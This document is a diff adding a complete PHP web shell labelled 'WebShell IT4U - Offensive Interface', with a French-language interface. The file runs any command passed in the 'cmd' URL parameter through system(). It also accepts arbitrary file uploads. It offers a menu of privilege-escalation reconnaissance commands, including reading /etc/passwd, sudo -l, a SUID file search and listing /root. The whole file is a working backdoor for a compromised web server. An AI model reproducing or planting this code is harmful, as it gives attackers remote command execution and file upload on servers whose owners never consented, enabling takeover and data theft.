@@ -1,0 +1,100 @@
+<?php
+// Commande shell principale
+if (isset($_GET['cmd']) && !empty($_GET['cmd'])) {
+    echo "<pre style='background:#111;color:#0f0;padding:10px;border:2px solid #0f0;font-family:monospace'>";
+    system($_GET['cmd']);
+    echo "</pre>";
+    exit;
+}
+
+// Upload
+if (isset($_POST['upload'])) {
+    $uploadDir = getcwd() . "/";
+    $filePath = $uploadDir . basename($_FILES['fichier']['name']);
+    if (move_uploaded_file($_FILES['fichier']['tmp_name'], $filePath)) {
+        echo "<p style='color:lime;'>✅ Fichier ".htmlspecialchars($_FILES['fichier']['name'])." uploadé avec succès !</p>";
+    } else {
+        echo "<p style='color:red;'>❌ Erreur lors de l'upload</p>";
+    }
+}
+?>
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>WebShell IT4U - Offensive Interface</title>
+    <style>
+        body {
+            background-color: #121212;
+            color: #00ff99;
+            font-family: monospace;
+            padding: 20px;
+        }
+        h1, h2 {
+            color: #00ffff;
+        }
+        input[type="text"], select {
+            background-color: #222;
+            border: 1px solid #00ff99;
+            color: #00ff99;
+            padding: 8px;
+            width: 70%;
+        }
+        input[type="submit"], button {
+            background-color: #00ff99;
+            color: #121212;
+            border: none;
+            padding: 8px 12px;
+            cursor: pointer;
+        }
+        textarea {
+            background-color: #111;
+            color: #0f0;
+            width: 100%;
+            height: 300px;
+            margin-top: 10px;
+        }
+        form {
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <h1>🛠 WebShell – Interface Offensive by IT4U</h1>
+
+    <!-- Commande shell -->
+    <form method="get">
+        <label for="cmd">💻 Commande shell :</label><br>
+        <input type="text" name="cmd" placeholder="Ex: whoami; uname -a" autofocus />
+        <input type="submit" value="Exécuter" />
+    </form>
+
+    <!-- Elévation de privilèges -->
+    <h2>🧱 Tests d'Elévation de privilèges</h2>
+    <form method="get">
+        <select name="cmd">
+            <option value="id">Afficher ID utilisateur</option>
+            <option value="uname -a">Infos kernel</option>
+            <option value="sudo -l">Sudo disponibles</option>
+            <option value="cat /etc/passwd">Afficher /etc/passwd</option>
+            <option value="find / -perm -4000 2>/dev/null">Lister les fichiers SUID</option>
+            <option value="ls -la /root">Essai accès /root</option>
+        </select>
+        <input type="submit" value="Tester" />
+    </form>
+
+    <!-- Navigation fichier -->
+    <h2>📁 Navigation rapide</h2>
+    <form method="get">
+        <input type="text" name="cmd" value="ls -la" />
+        <input type="submit" value="Lister" />
+    </form>
+
+    <!-- Upload -->
+    <h2>📥 Uploader un fichier</h2>
+    <form method="post" enctype="multipart/form-data">
+        <input type="file" name="fichier">
+        <input type="submit" name="upload" value="Uploader">
+    </form>
+</body>
+</html>
